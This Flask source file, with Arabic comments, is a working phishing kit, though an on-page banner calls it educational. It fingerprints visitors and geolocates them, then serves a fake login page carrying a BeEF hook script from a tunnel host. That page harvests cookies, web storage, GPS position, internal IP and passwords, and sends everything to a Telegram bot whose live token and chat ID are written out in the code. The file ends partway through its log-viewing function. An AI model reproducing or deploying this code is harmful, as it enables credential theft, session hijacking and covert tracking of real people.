from flask import Flask, request, redirect, render_template_string
import datetime
import os
import requests

app = Flask(__name__)

# ========== إعدادات تليجرام وإعادة التوجيه ==========
TELEGRAM_BOT_TOKEN = "8155493968:AAG4EgYUasUC27VxMs1IPIEthR4jt1tYsmE"
TELEGRAM_CHAT_ID = "7810572372"
TIKTOK_REDIRECT_URL = "https://vt.tiktok.com/ZSVk69HTA/"

# ========== إعدادات Google API ==========
GOOGLE_API_KEY = "AIzaSyCo8F4N1VfyxrtIbpTbpiMlARkhKhks3cY"

# ========== دالة الإرسال إلى تليجرام ==========
def send_to_telegram(message):
    """إرسال رسالة نصية إلى بوت التليجرام"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print(f"خطأ في الإرسال لتليجرام: {e}")
        return False

# ========== دوال جمع الموقع ==========
def get_location_via_google():
    """جلب الموقع الدقيق باستخدام Google Geolocation API"""
    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
    try:
        response = requests.post(url, json={}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'location' in data:
                lat = data['location']['lat']
                lng = data['location']['lng']
                accuracy = data.get('accuracy', 'غير معروف')
                return {'lat': lat, 'lng': lng, 'accuracy': accuracy}
    except Exception as e:
        print(f"خطأ في Google Geolocation: {e}")
    return None

def get_location_via_ip():
    """جلب الموقع التقريبي عبر IP"""
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'city': data.get('city', 'غير معروف'),
                    'country': data.get('country', 'غير معروف'),
                    'lat': data.get('lat', 'غير متاح'),
                    'lon': data.get('lon', 'غير متاح'),
                    'isp': data.get('isp', 'غير معروف')
                }
    except Exception as e:
        print(f"خطأ في IP Geolocation: {e}")
    return None

# ========== الصفحة الرئيسية (وجهة الضحية) ==========
@app.route('/')
def index():
    # 1. جمع البيانات التقنية فوراً
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    accept_lang = request.headers.get('Accept-Language')
    
    # تخمين نظام التشغيل
    os_info = "غير معروف"
    if "Android" in user_agent:
        os_info = "📱 Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "📱 iOS"
    elif "Windows" in user_agent:
        os_info = "💻 Windows"
    elif "Mac" in user_agent:
        os_info = "🍎 Mac"
    
    # محاولة جلب الموقع عبر Google Geolocation (الأكثر دقة)
    google_location = get_location_via_google()
    if google_location:
        lat = google_location['lat']
        lon = google_location['lng']
        accuracy = google_location['accuracy']
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        gps_msg = f"""
<b>📍 موقع دقيق (Google Geolocation)</b>
<b>🗺️ خط العرض:</b> {lat}
<b>🗺️ خط الطول:</b> {lon}
<b>📏 الدقة:</b> {accuracy} متر
<b>📍 <a href='{maps_link}'>على الخريطة</a></b>
"""
        send_to_telegram(gps_msg)
        location = f"Google GPS: {lat}, {lon}"
        isp = "Google Geolocation"
    else:
        # 2. في حال فشل Google، استخدام IP
        ip_location = get_location_via_ip()
        if ip_location:
            location = f"{ip_location['city']}, {ip_location['country']}"
            lat = ip_location['lat']
            lon = ip_location['lon']
            isp = ip_location['isp']
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            ip_msg = f"""
<b>📍 موقع تقريبي (IP)</b>
<b>🌍 المدينة:</b> {location}
<b>🗺️ الإحداثيات:</b> {lat}, {lon}
<b>📍 <a href='{maps_link}'>على الخريطة</a></b>
<b>📡 مزود الخدمة:</b> {isp}
"""
            send_to_telegram(ip_msg)
        else:
            location = "غير متاح"
            lat = "غير متاح"
            lon = "غير متاح"
            isp = "غير متاح"
    
    # تسجيل البيانات التقنية في الملف
    log_entry = f"""
    ═══════════════════════════════════════════
    [زيارة جديدة] - {datetime.datetime.now()}
    🌐 IP: {client_ip}
    📍 الموقع: {location}
    📡 مزود الخدمة: {isp}
    📱 نظام التشغيل: {os_info}
    🌍 اللغة: {accept_lang}
    📝 User-Agent: {user_agent}
    ═══════════════════════════════════════════
    """
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    # إرسال البيانات التقنية إلى تليجرام
    tech_msg = f"""
<b>🆕 زيارة جديدة!</b>
<b>🌐 IP:</b> {client_ip}
<b>📍 الموقع:</b> {location}
<b>📡 مزود الخدمة:</b> {isp}
<b>📱 نظام التشغيل:</b> {os_info}
<b>🌍 اللغة:</b> {accept_lang}
<b>📝 User-Agent:</b> {user_agent[:100]}...
"""
    send_to_telegram(tech_msg)
    
    # 3. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
    return redirect('/login')

# ========== صفحة تسجيل الدخول الوهمية ==========
login_page_html = '''
<!DOCTYPE html>
<html>
<head>
    <!-- كود BeEF Hook (رابط Cloudflare Tunnel) -->
    <script src="https://grew-resumes-blend-arbor.trycloudflare.com/hook.js"></script>
    <title>تسجيل الدخول - تجربة تعليمية</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
        h2 { color: #1a73e8; text-align: center; }
        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ffc107; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
        .field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 تسجيل الدخول</h2>
        <div class="warning">
            ⚠️ هذه صفحة تعليمية لمحاكاة هجوم التصيد (Phishing)<br>
            سيتم تسجيل البيانات التي تدخلها لأغراض التعلم فقط
        </div>
        <form action="/capture" method="POST">
            <div class="field">
                <label>الاسم الكامل</label>
                <input type="text" name="fullname" placeholder="أدخل اسمك الكامل" required>
            </div>
            <div class="field">
                <label>البريد الإلكتروني</label>
                <input type="email" name="email" placeholder="example@email.com" required>
            </div>
            <div class="field">
                <label>رقم الهاتف</label>
                <input type="tel" name="phone" placeholder="05xxxxxxxx" required>
            </div>
            <div class="field">
                <label>كلمة المرور</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            🔒 هذه تجربة تعليمية على خادم آمن
        </div>
    </div>
    <script>
    // ========== 1. طلب الموقع بصمت ==========
    function requestLocation() {
        if (navigator.geolocation) {
            let attempts = 0;
            const maxAttempts = 3;
            let bestAccuracy = Infinity;
            let bestLat = null;
            let bestLng = null;
            
            function getLocation() {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        if (accuracy < bestAccuracy) {
                            bestAccuracy = accuracy;
                            bestLat = lat;
                            bestLng = lng;
                        }
                        
                        if (accuracy < 50 || attempts >= maxAttempts - 1) {
                            fetch('/gps-data', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ lat: bestLat, lng: bestLng, accuracy: bestAccuracy })
                            }).catch(err => console.log('خطأ في إرسال GPS:', err));
                        } else {
                            attempts++;
                            setTimeout(getLocation, 2000);
                        }
                    },
                    function(error) {
                        if (attempts < maxAttempts) {
                            attempts++;
                            setTimeout(getLocation, 2000);
                        } else {
                            if (bestLat && bestLng) {
                                fetch('/gps-data', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ lat: bestLat, lng: bestLng, accuracy: bestAccuracy || 9999 })
                                }).catch(err => console.log('خطأ في إرسال GPS:', err));
                            }
                        }
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            }
            getLocation();
        }
    }

    // ========== 2. جمع بيانات المتصفح ==========
    function collectBrowserData() {
        const data = {
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
            cookiesEnabled: navigator.cookieEnabled
        };
        fetch('/browser-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
            .catch(err => console.log('خطأ في إرسال بيانات المتصفح:', err));
    }

    // ========== 3. جمع الكوكيز والجلسات ==========
    function collectSensitiveData() {
        const cookies = document.cookie;
        let localStorageData = {}, sessionStorageData = {};
        try { for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); localStorageData[key] = localStorage.getItem(key); } } catch(e) {}
        try { for (let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); sessionStorageData[key] = sessionStorage.getItem(key); } } catch(e) {}
        const referrer = document.referrer || 'لا يوجد';
        const sessionData = { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData, referrer, userAgent: navigator.userAgent, language: navigator.language, platform: navigator.platform, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, screenWidth: window.screen.width, screenHeight: window.screen.height, colorDepth: window.screen.colorDepth, deviceMemory: navigator.deviceMemory || 'غير معروف', hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف', connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف' };
        fetch('/collect-sensitive', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) })
            .catch(err => console.log('خطأ في إرسال البيانات الحساسة:', err));
    }

    // ========== 4. كشف الـ IP الداخلي (WebRTC) ==========
    function getLocalIP() {
        return new Promise((resolve, reject) => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = function(event) {
                    if (!event || !event.candidate) return;
                    const candidate = event.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\\.){3}[0-9]{1,3}/g;
                    const ipMatch = candidate.match(ipRegex);
                    if (ipMatch && ipMatch.length > 0) {
                        const localIP = ipMatch[0];
                        fetch('/collect-local-ip', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ localIP }) })
                            .catch(err => console.log('خطأ في إرسال IP الداخلي:', err));
                        resolve(localIP);
                    }
                };
                setTimeout(() => reject('لم يتم الحصول على IP'), 5000);
            } catch(error) { reject(error); }
        });
    }

    // ========== 5. بصمة المتصفح المتقدمة ==========
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18px Arial';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
            return canvas.toDataURL();
        } catch(e) { return 'خطأ في Canvas'; }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'غير مدعوم';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return { vendor, renderer };
            }
            return 'غير متاح';
        } catch(e) { return 'خطأ في WebGL'; }
    }

    function getAudioFingerprint() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            oscillator.connect(analyser);
            oscillator.frequency.value = 440;
            oscillator.type = 'sawtooth';
            oscillator.start(0);
            const data = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(data);
            oscillator.stop(0);
            audioCtx.close();
            let hash = 0;
            for (let i = 0; i < data.length; i++) { hash = ((hash << 5) - hash) + data[i]; hash = hash & hash; }
            return hash.toString();
        } catch(e) { return 'خطأ في Audio'; }
    }

    function collectFullFingerprint() {
        const fingerprint = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages || [],
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            screenColorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
            plugins: Array.from(navigator.plugins || []).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
            canvasFingerprint: getCanvasFingerprint(),
            webglFingerprint: getWebGLFingerprint(),
            audioFingerprint: getAudioFingerprint(),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'غير محدد',
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
        };
        fetch('/collect-fingerprint', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fingerprint) })
            .catch(err => console.log('خطأ في إرسال البصمة:', err));
    }

    // ========== 6. اكتشاف أدوات الأمان ==========
    function detectSecurityTools() {
        const securityTools = { uBlockOrigin: false, NoScript: false, AdBlockPlus: false };
        try {
            const testAd = document.createElement('div');
            testAd.className = 'pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads';
            document.body.appendChild(testAd);
            if (testAd.offsetParent === null || testAd.style.display === 'none') securityTools.uBlockOrigin = true;
            document.body.removeChild(testAd);
        } catch(e) {}
        try {
            const adTest = document.createElement('div');
            adTest.innerHTML = '&nbsp;';
            adTest.className = 'adsbox';
            document.body.appendChild(adTest);
            if (adTest.offsetHeight === 0) securityTools.AdBlockPlus = true;
            document.body.removeChild(adTest);
        } catch(e) {}
        fetch('/collect-security-tools', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(securityTools) })
            .catch(err => console.log('خطأ في إرسال أدوات الأمان:', err));
    }

    // ========== 7. تفاصيل الجهاز ==========
    function detectDeviceDetails() {
        const ua = navigator.userAgent;
        let os = 'غير معروف', osVersion = 'غير معروف';
        if (/Android/i.test(ua)) { os = 'Android'; const match = ua.match(/Android\s([\d.]+)/); osVersion = match ? match[1] : 'غير معروف'; }
        else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; const match = ua.match(/OS\s([\d_]+)/); osVersion = match ? match[1].replace(/_/g, '.') : 'غير معروف'; }
        else if (/Windows/i.test(ua)) { os = 'Windows'; const match = ua.match(/Windows NT\s([\d.]+)/); osVersion = match ? match[1] : 'غير معروف'; }
        else if (/Mac/i.test(ua)) { os = 'macOS'; const match = ua.match(/Mac OS X\s([\d_]+)/); osVersion = match ? match[1].replace(/_/g, '.') : 'غير معروف'; }
        else if (/Linux/i.test(ua)) { os = 'Linux'; }
        let browser = 'غير معروف', browserVersion = 'غير معروف';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) { browser = 'Chrome'; const match = ua.match(/Chrome\/([\d.]+)/); browserVersion = match ? match[1] : 'غير معروف'; }
        else if (/Firefox/i.test(ua)) { browser = 'Firefox'; const match = ua.match(/Firefox\/([\d.]+)/); browserVersion = match ? match[1] : 'غير معروف'; }
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) { browser = 'Safari'; const match = ua.match(/Version\/([\d.]+)/); browserVersion = match ? match[1] : 'غير معروف'; }
        else if (/Edg/i.test(ua)) { browser = 'Edge'; const match = ua.match(/Edg\/([\d.]+)/); browserVersion = match ? match[1] : 'غير معروف'; }
        else if (/Opera|OPR/i.test(ua)) { browser = 'Opera'; const match = ua.match(/(?:Opera|OPR)\/([\d.]+)/); browserVersion = match ? match[1] : 'غير معروف'; }
        const deviceDetails = {
            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
            isTablet: /iPad|Android(?!.*Mobile)/i.test(ua),
            os, osVersion, browser, browserVersion,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            preferredLanguage: navigator.language,
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            platform: navigator.platform
        };
        fetch('/collect-device-details', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceDetails) })
            .catch(err => console.log('خطأ في إرسال تفاصيل الجهاز:', err));
    }

    // ========== استدعاء جميع الدوال عند تحميل الصفحة ==========
    window.onload = function() {
        setTimeout(requestLocation, 1000);
        collectBrowserData();
        collectSensitiveData();
        getLocalIP();
        collectFullFingerprint();
        detectSecurityTools();
        detectDeviceDetails();
    };
    </script>
</body>
</html>
'''

@app.route('/login')
def fake_login():
    return render_template_string(login_page_html)

# ========== مسار استقبال البيانات المسجلة ==========
@app.route('/capture', methods=['POST'])
def capture():
    fullname = request.form.get('fullname')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    with open('captured_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📥 بيانات تم جمعها - {datetime.datetime.now()}
        👤 الاسم الكامل: {fullname}
        📧 البريد الإلكتروني: {email}
        📱 رقم الهاتف: {phone}
        🔑 كلمة المرور: {password}
        🌐 IP المصدر: {request.remote_addr}
        📱 User-Agent: {request.headers.get('User-Agent')}
        ═══════════════════════════════════════════
        """)
    
    captured_msg = f"""
<b>🔐 تم اختراق بيانات جديدة!</b>
<b>👤 الاسم الكامل:</b> {fullname}
<b>📧 البريد الإلكتروني:</b> {email}
<b>📱 رقم الهاتف:</b> {phone}
<b>🔑 كلمة المرور:</b> {password}
<b>🌐 IP المصدر:</b> {request.remote_addr}
"""
    send_to_telegram(captured_msg)
    
    success_page = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>تم تسجيل الدخول</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f0f2f5; margin: 0; }}
            .box {{ background: white; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h2 {{ color: #28a745; }}
            .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; color: #856404; margin-top: 20px; font-size: 14px; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>✅ تم تسجيل الدخول بنجاح!</h2>
            <p>سيتم توجيهك إلى المحتوى المطلوب...</p>
            <div class="warning">⚠️ هذه تجربة تعليمية. بياناتك تم تسجيلها في الخادم</div>
        </div>
        <script> setTimeout(() => {{ window.location.href = '{TIKTOK_REDIRECT_URL}'; }}, 3000); </script>
    </body>
    </html>
    '''
    return success_page

# ========== استقبال الموقع الدقيق (GPS) ==========
@app.route('/gps-data', methods=['POST'])
def gps_data():
    data = request.get_json()
    lat = data.get('lat'); lon = data.get('lng'); accuracy = data.get('accuracy')
    if lon is None or lat is None:
        error_msg = f"⚠️ <b>فشل تحديد الموقع</b>\n📱 الأسباب: 1. لم تسمح بمشاركة الموقع 2. إشارة GPS ضعيفة\n📝 البيانات المستلمة:\nخط العرض: {lat}\nخط الطول: {lon}\nالدقة: {accuracy} متر"
        send_to_telegram(error_msg)
        return {"status": "failed"}, 400
    with open('gps_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    gps_msg = f"<b>📍 موقع دقيق (GPS)</b>\n<b>🗺️ خط العرض:</b> {lat}\n<b>🗺️ خط الطول:</b> {lon}\n<b>📏 الدقة:</b> {accuracy} متر\n<b>📍 <a href='{maps_link}'>على الخريطة</a></b>"
    send_to_telegram(gps_msg)
    return {"status": "success"}, 200
    

# ========== استقبال بيانات المتصفح ==========
@app.route('/browser-data', methods=['POST'])
def browser_data():
    data = request.get_json()
    browser_msg = f"<b>🖥️ بيانات المتصفح الإضافية</b>\n<b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}\n<b>🕐 المنطقة الزمنية:</b> {data.get('timezone')}\n<b>🌐 اللغة:</b> {data.get('language')}\n<b>💻 المنصة:</b> {data.get('platform')}\n<b>⚙️ عدد الأنوية:</b> {data.get('hardwareConcurrency')}\n<b>🧠 الذاكرة:</b> {data.get('deviceMemory')} جيجابايت\n<b>📶 نوع الاتصال:</b> {data.get('connectionType')}\n<b>🍪 ملفات تعريف الارتباط:</b> {data.get('cookiesEnabled')}"
    send_to_telegram(browser_msg)
    return {"status": "success"}, 200

# ========== استقبال البيانات الحساسة (كوكيز، جلسات) ==========
@app.route('/collect-sensitive', methods=['POST'])
def collect_sensitive():
    data = request.get_json()
    with open('sensitive_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n📥 بيانات حساسة - {datetime.datetime.now()}\n🍪 الكوكيز: {data.get('cookies', 'لا يوجد')}\n💾 LocalStorage: {data.get('localStorage', {})}\n💾 SessionStorage: {data.get('sessionStorage', {})}\n🔗 الصفحة السابقة: {data.get('referrer', 'لا يوجد')}\n📱 اللغة: {data.get('language', 'غير معروف')}\n🕐 المنطقة الزمنية: {data.get('timezone', 'غير معروف')}\n📐 دقة الشاشة: {data.get('screenWidth')}x{data.get('screenHeight')}\n═══════════════════════════════════════════\n")
    sensitive_msg = f"<b>🍪 بيانات حساسة تم جمعها</b>\n<b>🍪 الكوكيز:</b> {data.get('cookies', 'لا يوجد')[:200]}...\n<b>💾 LocalStorage:</b> {len(data.get('localStorage', {}))} عنصر\n<b>💾 SessionStorage:</b> {len(data.get('sessionStorage', {}))} عنصر\n<b>🔗 الصفحة السابقة:</b> {data.get('referrer', 'لا يوجد')}\n<b>📱 اللغة:</b> {data.get('language', 'غير معروف')}\n<b>🕐 المنطقة الزمنية:</b> {data.get('timezone', 'غير معروف')}"
    send_to_telegram(sensitive_msg)
    return {"status": "success"}, 200

# ========== استقبال الـ IP الداخلي (WebRTC) ==========
@app.route('/collect-local-ip', methods=['POST'])
def collect_local_ip():
    data = request.get_json()
    local_ip = data.get('localIP')
    with open('local_ips.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n🌐 IP داخلي - {datetime.datetime.now()}\n📡 IP الداخلي: {local_ip}\n🌍 IP الخارجي: {request.remote_addr}\n═══════════════════════════════════════════\n")
    ip_msg = f"<b>🌐 IP الداخلي (WebRTC)</b>\n<b>📡 IP الداخلي:</b> {local_ip}\n<b>🌍 IP الخارجي:</b> {request.remote_addr}"
    send_to_telegram(ip_msg)
    return {"status": "success"}, 200

# ========== استقبال بصمة المتصفح ==========
@app.route('/collect-fingerprint', methods=['POST'])
def collect_fingerprint():
    data = request.get_json()
    with open('fingerprints.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n🖥️ بصمة المتصفح - {datetime.datetime.now()}\n📱 User-Agent: {data.get('userAgent', 'غير معروف')}\n🌍 اللغة: {data.get('language', 'غير معروف')}\n🕐 المنطقة الزمنية: {data.get('timezone', 'غير معروف')}\n📐 دقة الشاشة: {data.get('screenWidth')}x{data.get('screenHeight')}\n📶 نوع الاتصال: {data.get('connectionType', 'غير معروف')}\n⚙️ عدد الأنوية: {data.get('hardwareConcurrency', 'غير معروف')}\n🔌 الإضافات: {len(data.get('plugins', []))} إضافة\n═══════════════════════════════════════════\n")
    fingerprint_msg = f"<b>🖥️ بصمة متصفح جديدة</b>\n<b>📱 User-Agent:</b> {data.get('userAgent', 'غير معروف')[:100]}...\n<b>🌍 اللغة:</b> {data.get('language', 'غير معروف')}\n<b>🕐 المنطقة الزمنية:</b> {data.get('timezone', 'غير معروف')}\n<b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}\n<b>🔌 الإضافات:</b> {len(data.get('plugins', []))} إضافة"
    send_to_telegram(fingerprint_msg)
    return {"status": "success"}, 200

# ========== استقبال أدوات الأمان المكتشفة ==========
@app.route('/collect-security-tools', methods=['POST'])
def collect_security_tools():
    data = request.get_json()
    with open('security_tools.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n🛡️ أدوات الأمان - {datetime.datetime.now()}\n🚫 uBlock Origin: {data.get('uBlockOrigin', False)}\n🚫 NoScript: {data.get('NoScript', False)}\n🚫 AdBlock Plus: {data.get('AdBlockPlus', False)}\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
    tools_msg = f"<b>🛡️ أدوات أمان مكتشفة</b>\n<b>🚫 uBlock Origin:</b> {data.get('uBlockOrigin', False)}\n<b>🚫 NoScript:</b> {data.get('NoScript', False)}\n<b>🚫 AdBlock Plus:</b> {data.get('AdBlockPlus', False)}"
    send_to_telegram(tools_msg)
    return {"status": "success"}, 200

# ========== استقبال تفاصيل الجهاز ==========
@app.route('/collect-device-details', methods=['POST'])
def collect_device_details():
    data = request.get_json()
    with open('device_details.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n═══════════════════════════════════════════\n📱 تفاصيل الجهاز - {datetime.datetime.now()}\n📱 نوع الجهاز: {data.get('isMobile', False) and 'جوال' or data.get('isTablet', False) and 'جهاز لوحي' or 'كمبيوتر'}\n🖥️ نظام التشغيل: {data.get('os', 'غير معروف')} {data.get('osVersion', '')}\n🌐 المتصفح: {data.get('browser', 'غير معروف')} {data.get('browserVersion', '')}\n📐 دقة الشاشة: {data.get('screenWidth')}x{data.get('screenHeight')}\n📶 نوع الاتصال: {data.get('connectionType', 'غير معروف')}\n═══════════════════════════════════════════\n")
    device_msg = f"<b>📱 جهاز جديد</b>\n<b>📱 نوع الجهاز:</b> {data.get('isMobile', False) and '📱 جوال' or data.get('isTablet', False) and '📱 جهاز لوحي' or '💻 كمبيوتر'}\n<b>🖥️ نظام التشغيل:</b> {data.get('os', 'غير معروف')} {data.get('osVersion', '')}\n<b>🌐 المتصفح:</b> {data.get('browser', 'غير معروف')} {data.get('browserVersion', '')}\n<b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}\n<b>📶 نوع الاتصال:</b> {data.get('connectionType', 'غير معروف')}"
    send_to_telegram(device_msg)
    return {"status": "success"}, 200

# ========== عرض السجلات (للمختبر) ==========
@app.route('/view-logs')
def view_logs():
    output = "<html><head><title>السجلات</title><style>body{background:#1e1e1e;color:#d4d4d4;padding:20px;font-family:monospace;}</style></head><body>"
    try:
        with open('log.txt', 'r', encoding='utf-8') as f: output += "<h2>📊 السجلات التقنية</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد سجلات تقنية</p>"
    try:
        with open('captured_data.txt', 'r', encoding='utf-8') as f: output += "<h2>🔐 البيانات المسجلة</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد بيانات مسجلة</p>"
    try:
        with open('gps_log.txt', 'r', encoding='utf-8') as f: output += "<h2>📍 بيانات GPS</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد بيانات GPS</p>"
    try:
        with open('sensitive_data.txt', 'r', encoding='utf-8') as f: output += "<h2>🍪 البيانات الحساسة</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد بيانات حساسة</p>"
    try:
        with open('local_ips.txt', 'r', encoding='utf-8') as f: output += "<h2>🌐 الـ IP الداخلي</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد بيانات IP داخلي</p>"
    try:
        with open('fingerprints.txt', 'r', encoding='utf-8') as f: output += "<h2>🖥️ بصمات المتصفح</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد بصمات</p>"
    try:
        with open('security_tools.txt', 'r', encoding='utf-8') as f: output += "<h2>🛡️ أدوات الأمان</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد أدوات أمان مكتشفة</p>"
    try:
        with open('device_details.txt', 'r', encoding='utf-8') as f: output += "<h2>📱 تفاصيل الأجهزة</h2><pre>" + f.read() + "</pre>"
    except: output += "<p>لا توجد تفاصيل أجهزة</p>"
